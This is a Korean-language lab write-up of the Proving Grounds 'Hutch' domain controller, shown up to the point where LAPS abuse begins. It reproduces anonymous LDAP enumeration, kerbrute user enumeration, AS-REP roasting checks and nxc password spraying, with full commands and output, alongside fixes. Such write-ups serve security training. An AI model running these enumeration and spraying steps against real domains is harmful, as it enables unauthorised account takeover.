---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/dcsync
  - tech/ad/pth
  - tech/ad/userenum
  - tech/cred/spray
  - tech/svc/smb
  - tech/exec/winrm
type: machine
platform: pg
os: windows
ip: 192.168.178.122
domain: hutch.offsec
ports: [53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, msrpc, ncacn_http, netbios-ssn]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 8
---

> [!info] 요약
> 타겟 `192.168.216.122` (5/14 정찰 시점에는 `192.168.178.122`) · Windows Server 2019 build 17763 · `HUTCHDC.hutch.offsec` · Intermediate · **플래그 2개 중 1개 — `proof.txt` 만 확보, `local.txt` 미확보**
> 진입점: 익명 LDAP 서브트리 조회로 사용자 14명 열거 → `description` 속성의 평문 `CrabSharkJellyfish192` → 스프레이로 `fmcsorley` 확보
> 권한상승: BloodHound 의 `fmcsorley --ReadLAPSPassword--> HUTCHDC` 엣지 → pyLAPS 로 `ms-Mcs-AdmPwd` 읽기 → 그 값이 도메인 Administrator 의 비밀번호 → DCSync → PtH 로 evil-winrm
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 이 노트의 근거 등급
> - **Kali 산출물로 실증** — `~/PG/Hutch/nmap.log` · `users.txt` · `kerbrute_linux_386` · BloodHound JSON 7종(`20260515132325_*`) · `~/git/pyLAPS/pyLAPS.py` 소스
> - **볼트 스크린샷 6장으로 실증** — 익명 `ldapsearch` 열거 · `ReadLAPSPassword` 엣지 · pyLAPS 출력 · `netexec` 관리자 확인 · `secretsdump` 덤프 · evil-winrm 의 `type proof.txt`+`ipconfig`. 값이 본문과 한 글자도 다르지 않음
> - **대조 원본이 없는 출력** — `kerbrute` · `GetNPUsers` · `nxc` 스프레이 · `smbmap` · evil-winrm 의 `dir` 목록(스크린샷은 `type` 부터 시작함)
> - **`~/.zsh_history` 에 이 박스 구간(2026-05-14~15)이 없음.** 버퍼에서 밀려난 것이고 **미실행의 증거가 아님** — 스크린샷 6장이 그날 대화형 터미널 앞에 사람이 있었다는 양성 증거이고, 그 스크린샷에 `┌──(kali㉿kali)-[~/PG/Hutch]` 프롬프트가 그대로 찍혀 있음
> - 근거가 없는 서술은 `[가정]` 으로 표시함. NT 해시 대조는 2026-08-20 에 직접 계산한 것임

## Target #1 – 192.168.216.122

### Initial Access – 익명 LDAP 바인드가 노출한 `description` 필드의 평문 비밀번호로 도메인 계정 탈취

**Vulnerability Explanation:** 익명 정보 노출과 자격증명 평문 저장이 겹침.
- 익명 simple 바인드로 `DC=hutch,DC=offsec` **서브트리 조회**가 허용됨 — 인증 없이 사용자 14명과 그 속성 전량이 반환됨. RootDSE 노출은 LDAP 표준 동작이지만 서브트리 조회는 아님
- `fmcsorley` 의 `description` 에 평문 비밀번호가 그대로 적혀 있음 — 「Password set to CrabSharkJellyfish192 at user's request.」
- 어느 한쪽만으로는 성립하지 않음. 익명 조회가 막혔으면 스프레이할 후보 자체가 없고, `description` 이 비었으면 사용자 목록만 남음

**Vulnerability Fix:**
- `CN=Directory Service` 의 `dSHeuristics` 를 기본값으로 되돌려 익명 LDAP 오퍼레이션 차단(`fLDAPBlockAnonOps`). `EveryoneIncludesAnonymous` 도 함께 점검
- `description`·`info`·`comment` 에 비밀번호 기재 금지. 정기 감사 — `Get-ADUser -Filter * -Properties Description,Info`
- 계정 잠금 정책 설정. 이 도메인은 잠금이 없어 196회 실패 스프레이가 아무 계정도 잠그지 못했음

**Severity:** High — 무인증 정보 노출이 그대로 유효한 도메인 자격증명이 됨(이 단계에서 코드 실행은 아님)

**Steps to reproduce the attack:**
1. `ldapsearch -x -s base` 로 RootDSE 조회 → `defaultNamingContext` 확보
2. 같은 baseDN 으로 서브트리 조회 → `sAMAccountName` 14개 회수
3. `kerbrute userenum` 으로 13개 유효 확인, `impacket-GetNPUsers` 로 AS-REP 대상 0건 확정
4. 같은 baseDN 에 `description` 전수 조회 → 평문 `CrabSharkJellyfish192`
5. `nxc smb -u users.txt -p 'CrabSharkJellyfish192'` 스프레이 → `fmcsorley` 만 `[+]`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.216.122 | TCP: 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389 (+ 동적 RPC 49666·49668·49673·49674·49676·49692·49762) |

**노트 안에 IP 가 두 개 공존함 — 오타가 아님.** 5/14 정찰은 `192.168.178.122`, 5/15 본작업은 전부 `192.168.216.122` 임. 세션이 바뀌며 PG 가 인스턴스를 재배정한 것이고, 타겟 자신의 최종 `ipconfig` 가 `192.168.216.122` 를 보고함. **하나로 통일하지 않음** — 어느 명령이 어느 세션의 것인지 알아야 복사해 쓸 때 혼란이 없음.

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat ~/.zshrc | grep nnmap
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'

┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Thu May 14 16:14:56 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.178.122
Nmap scan report for 192.168.178.122
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Thu, 14 May 2026 07:16:25 GMT
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 07:15:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49762/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-14T07:16:28
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   65.61 ms 192.168.45.1
2   65.50 ms 192.168.45.254
3   65.92 ms 192.168.251.1
4   66.01 ms 192.168.178.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 16:17:08 2026 -- 1 IP address (1 host up) scanned in 131.84 seconds
```
— 출처: `~/PG/Hutch/nmap.log`

**버전 판정 독립 근거 둘** — ① nmap 의 `Aggressive OS guesses: Windows Server 2019 (92%)` + `Service Info: Host: HUTCHDC` ② 인증된 SMB 세션이 스스로 보고한 배너 `Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec)`. 두 번째가 빌드 번호까지 확정함. 도메인 기능 수준도 교차 검증됨 — RootDSE 의 `domainFunctionality: 7` ↔ BloodHound 덤프의 `"functionallevel": "2016"`.

`smb2-security-mode` 가 **서명 강제**(`Message signing enabled and required`)라 NTLM 릴레이 경로는 이 시점에 배제됨.

80/tcp IIS 10.0 은 `PUT`·`MKCOL`·`MOVE` 를 `Allowed Methods` 로 보고했으나 **실제로 던져본 기록이 하나도 없음.** `http-methods` NSE 는 `OPTIONS` 응답 헤더를 옮길 뿐 시도하지 않으므로, 이 출력은 「IIS 가 WebDAV 모듈을 로드했다」이지 「인증 없이 허용된다」가 아님. 이 미시도가 `local.txt` 미확보와 연결되는 지점은 `Post-Exploitation` 절에 적었음.

**LDAP RootDSE — 인증 없이 baseDN 을 확보**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -H ldap://192.168.216.122 -x -s base
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=hutch,DC=offsec
ldapServiceName: hutch.offsec:hutchdc$@HUTCH.OFFSEC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
serverName: CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi
 guration,DC=hutch,DC=offsec
schemaNamingContext: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=hutch,DC=offsec
namingContexts: CN=Configuration,DC=hutch,DC=offsec
namingContexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=DomainDnsZones,DC=hutch,DC=offsec
namingContexts: DC=ForestDnsZones,DC=hutch,DC=offsec
isSynchronized: TRUE
highestCommittedUSN: 73793
dsServiceName: CN=NTDS Settings,CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
dnsHostName: hutchdc.hutch.offsec
defaultNamingContext: DC=hutch,DC=offsec
currentTime: 20260515014053.0Z
configurationNamingContext: CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
*(원본의 `supportedControl`/`supportedLDAPPolicies` 40여 줄은 판단에 쓰이지 않아 생략함.)*

여기서 공짜로 얻는 것 — `defaultNamingContext`(이후 모든 질의의 baseDN) · `dnsHostName: hutchdc.hutch.offsec`(`/etc/hosts` 등록·SPN 조립에 필요) · `domainFunctionality: 7` · `supportedSASLMechanisms: GSSAPI`(Kerberos 바인드 가능).

> [!warning] 기록된 명령으로는 기록된 출력이 안 나옴 — 실측으로 확인함
> 위 명령은 `-x` 단독인데 출력에 `Enter LDAP Password:` 가 있음. 2026-08-20 에 같은 Kali(OpenLDAP `ldapsearch 2.6.10`)로 때려 확인한 결과 **`-x` 단독은 비밀번호를 묻지 않고, `-W` 가 있어야 그 프롬프트가 뜸.** 즉 실제로 친 명령에는 `-W` 가 함께 있었거나 전사 과정에서 누락된 것임.
> **결과에는 영향 없음** — `-D`(바인드 DN)가 없으므로 무엇을 넣든 익명 바인드이고 `result: 0 Success` 가 그것을 확인함. 정정하지 않고 차이를 명시하는 이유는 「노트대로 쳤는데 화면이 다르다」가 재현자를 반드시 혼란시키기 때문임.

**익명 서브트리 조회 — 사용자 열거**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
Guest
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```

![[Pasted image 20260515105250.png]]

이 14개가 `~/PG/Hutch/users.txt` 로 저장돼 지금도 남아 있음.

| 요소 | 역할 | 빼면 |
|---|---|---|
| `-x` | simple 바인드(SASL 아님) | 기본은 SASL/GSSAPI 라 Kerberos 자격증명이 없으면 실패함. 익명 시도에는 필수 |
| `-b "DC=hutch,DC=offsec"` | 검색 시작점 | RootDSE 에서 얻은 `defaultNamingContext`. 없으면 서버가 기본 baseDN 을 쓰지 않고 거부함 |
| `-s sub` | 하위 트리 전체 | 기본값이 `sub` 이나 명시가 안전함. `base` 면 개체 하나만 봄 |
| `"(&(objectclass=user))"` | 필터 | `user` 클래스는 컴퓨터 계정도 포함함(computer 가 user 의 하위 클래스). 사람만 원하면 `(&(objectCategory=person)(objectClass=user))` |
| `grep … \| cut -f2 -d" "` | `sAMAccountName:` 값만 | LDIF 는 `속성: 값` 형식이라 공백 하나로 잘림 |

**`Administrator`·`krbtgt`·`domainadmin` 이 빠져 있는 것은 열거 실패가 아님.** BloodHound 덤프(인증된 `fmcsorley` 로 수집)와 대조하면 산술이 맞음:

```text
NT AUTHORITY@HUTCH.OFFSEC  | admincount=null    ← BloodHound 가 만드는 가상 개체
DOMAINADMIN@HUTCH.OFFSEC   | admincount=true    ← 익명 조회에서 안 보임
KRBTGT@HUTCH.OFFSEC        | admincount=true    ← 익명 조회에서 안 보임
ADMINISTRATOR@HUTCH.OFFSEC | admincount=true    ← 익명 조회에서 안 보임
(나머지 14개)              | admincount=false   ← 익명 조회에서 전부 보임
```
— 출처: `~/PG/Hutch/20260515132325_users.json` 을 `jq` 로 조회

18개(BloodHound) − 3개(`adminCount=true`) − 1개(가상 개체) = **14개(익명 조회).** 어긋남이 없음.

메커니즘은 **AdminSDHolder / SDProp** 임. AD 는 특권 그룹 멤버에게 `adminCount=1` 을 찍고, 60분마다 `SDProp` 이 그 개체들의 DACL 을 `CN=AdminSDHolder` 템플릿으로 덮어쓰며 상속을 끊음. 도메인 상위에 붙은 관대한 읽기 ACE 가 이 계정들에는 도달하지 않음.

**익명 서브트리 조회가 되는 원인은 [[Resourced]] 와 다름.** Resourced 는 `Pre-Windows 2000 Compatible Access` 에 `S-1-5-7`(ANONYMOUS LOGON)이 들어 있는 것이 원인이었으나, 이 도메인의 같은 그룹 멤버는 `Authenticated Users`(`S-1-5-11`) 하나뿐임(`20260515132325_groups.json`).

**[가정]** 남은 후보는 둘 — ① `dSHeuristics` 7번째 문자를 `2` 로 설정해 `fLDAPBlockAnonOps` 해제 ② `EveryoneIncludesAnonymous` 를 켜서 `Everyone` ACE 가 익명에도 적용. **DC 측 설정을 볼 수 없어 확정 못 함.** 확정된 것은 관측 사실뿐임 — 익명 simple 바인드로 서브트리 조회가 성공했고 `adminCount=1` 이 아닌 사용자 14개와 그 `description` 이 반환됨.

**kerbrute — 유효 사용자 확인**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ./kerbrute_linux_386 userenum --dc 192.168.216.122 -d hutch.offsec users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/15/26 - Ronnie Flathers @ropnop

2026/05/15 11:14:36 >  Using KDC(s):
2026/05/15 11:14:36 >   192.168.216.122:88

2026/05/15 11:14:36 >  [+] VALID USERNAME:       ltaunton@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       opatry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       rplacidi@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jsparwell@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       acostello@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       oknee@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jmckendry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jfrarey@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       avictoria@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       cluddy@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       eaburrow@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       agitthouse@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       fmcsorley@hutch.offsec
2026/05/15 11:14:36 >  Done! Tested 14 usernames (13 valid) in 0.140 seconds
```

14개 중 13개 유효. 빠진 하나는 `Guest` 이고 비활성 계정임(BloodHound 덤프의 `GUEST@HUTCH.OFFSEC | enabled=false`). `userenum` 은 사전인증 데이터 없이 AS-REQ 를 던져 **KDC 의 에러 코드로만 구분**하므로 비밀번호를 하나도 보내지 않음 — `badPwdCount` 가 오르지 않아 스프레이 전 목록 정제에 가장 안전함. 다만 이벤트 4768/4771 에는 남음. 0.140초에 14개를 끝냈음.

**AS-REP Roasting — 0건**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-GetNPUsers hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User rplacidi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User opatry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ltaunton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acostello doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsparwell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oknee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmckendry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User avictoria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jfrarey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eaburrow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cluddy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User agitthouse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fmcsorley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`UF_DONT_REQUIRE_PREAUTH`(0x400000)가 켜진 계정이 하나도 없음 — **AS-REP roast 경로 완전 배제.** 0건이 실패가 아니라 확정임: `doesn't have ... set` 은 계정이 존재해야 나오는 메시지라 13명의 존재·활성이 재확인됨. 첫 줄의 사용자명 없는 `KDC_ERR_CLIENT_REVOKED` 가 `users.txt` 첫 행 `Guest` 이고, kerbrute 가 13/14 로 센 그 하나와 같은 계정임.

### Initial Access – LDAP `description` → 스프레이

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=*))"  | grep description:
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
```

마지막 줄이 전부임. 어느 계정의 것인지는 BloodHound 덤프가 확정해 줌:

```json
{
  "name": "FMCSORLEY@HUTCH.OFFSEC",
  "sid": "S-1-5-21-2216925765-458455009-2806096489-1115",
  "desc": "Password set to CrabSharkJellyfish192 at user's request. Please change on next login."
}
```
— 출처: `~/PG/Hutch/20260515132325_users.json` 을 `jq` 로 조회

> [!danger] 위 `grep` 출력은 잘려 있음 — LDIF 의 접힘을 놓치면 비밀번호를 잃음
> LDIF 는 긴 값을 여러 줄로 접고 이어지는 줄을 **공백 한 칸**으로 시작함(RFC 2849). 그래서 `grep description:` 만 하면 첫 줄만 잡히고 뒷부분이 사라짐 — 위 출력은 `Please c` 에서 끊겼음.
> **이 박스는 비밀번호가 앞쪽에 있어서 살았음.** 뒤쪽이었으면 잘려 나갔고 「설명 필드에는 아무것도 없다」로 결론냈을 것임.
> 접힘을 애초에 끄는 법(실측, `ldapsearch -h` 의 `-o ldif_wrap=<width> | no`) — **하이픈이 아니라 밑줄임:**
> ```bash
> ldapsearch -o ldif_wrap=no -x -H ldap://<IP> -b '<baseDN>' \
>   '(objectClass=user)' sAMAccountName description | grep -i description
> ```
> 이미 접힌 출력을 펴려면 `sed -e ':a' -e '$!N;s/\n //;ta' -e 'P;D'`. 값이 `description::` 처럼 콜론 두 개면 **base64** 라 `base64 -d` 가 필요함.

**먼저 시도한 것 — 사용자명 = 비밀번호(전조합 196회)**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\fmcsorley:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:rplacidi STATUS_LOGON_FAILURE 
<SNIP>
```

`-u 파일 -p 파일` 은 nxc 의 **기본 동작이 14 × 14 = 196회 전조합**임 — 출력이 그것을 보여줌(`Guest:Guest` 다음이 `rplacidi:Guest`, 즉 비밀번호 고정·사용자 순회). 각 계정이 14회 실패했고, 잠금 임계값이 5나 10 이었으면 도메인 전 계정이 잠겨 리버트 말고는 복구 방법이 없었음. **잠금 정책이 없어서 살았고, 성공한 절차가 아니라 운이 좋았던 절차임.** `--no-bruteforce` 가 행 단위 짝짓기 옵션이고, `--ignore-pw-decoding` 은 `-p` 가 파일일 때만 의미가 있음(실측 — *"Ignore non UTF-8 characters when decoding the password file"*).

**`description` 에서 얻은 비밀번호로 스프레이**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p "CrabSharkJellyfish192" --continue-on-success --ignore-pw-decoding  
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
```

**`fmcsorley:CrabSharkJellyfish192`** 확보.

비밀번호가 적힌 계정이 `fmcsorley` 라는 사실은 BloodHound 를 돌린 **뒤에** 확정된 것임 — `grep description:` 만으로는 어느 개체의 속성인지 알 수 없음(LDIF 의 `dn:` 줄이 따로 떨어져 있고 grep 이 그것을 버림). 정보 부족 상태에서 전원 스프레이가 정답이었고, 비용은 사용자당 1회임. 처음부터 짝지어 뽑으려면:

```bash
ldapsearch -x -H ldap://<IP> -b '<baseDN>' '(objectClass=user)' sAMAccountName description \
  | sed -e ':a' -e '$!N;s/\n //;ta' -e 'P;D' \
  | grep -A1 -i 'sAMAccountName'
```

`[-]` 가 전부 `STATUS_LOGON_FAILURE` 뿐인 것도 정보임 — 잠김(`STATUS_ACCOUNT_LOCKED_OUT`)이나 만료(`STATUS_PASSWORD_EXPIRED`)가 하나도 없어 앞의 196회가 아무 계정도 잠그지 않았음이 여기서 확인됨.

**확보 후 공유 점검 — 소득 없음**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ smbmap -H 192.168.216.122 -u fmcsorley -p CrabSharkJellyfish192
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] IP: 192.168.216.122:445     Name: 192.168.216.122           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

기본 공유뿐임 — [[Resourced]] 의 `Password Audit` 같은 비표준 공유가 없어 SMB 경로가 아님이 확정됨. `SYSVOL` 의 GPP `cpassword` 는 **확인한 기록이 없음**(관측 없음) — READ ONLY 라도 `nxc smb -M gpp_password`·`gpp_autologin` 은 2분짜리 조사임.

**Local.txt value:**
**없음 — 미확보.** 포털이 이 박스를 `0/2` 로 표시하고(2026-08-20 실측) `_STATUS.md` 판정도 `1/2` 임. 확보한 것은 `proof.txt` 하나뿐이고, 놓친 원인과 남은 후보는 `Post-Exploitation` 절에 적었음. **「배제」가 아니라 「미완」임.**

### Privilege Escalation – LAPS 읽기 권한(`ReadLAPSPassword`) 남용 → DCSync

**Vulnerability Explanation:** 1세대 LAPS 의 평문 저장 + ACL 오설정.
- 1세대 LAPS 는 컴퓨터의 로컬 관리자 비밀번호를 AD 컴퓨터 객체의 `ms-Mcs-AdmPwd` 속성에 **평문**으로 저장함. 보호 장치는 암호화가 아니라 **속성 수준 ACL 하나뿐**임
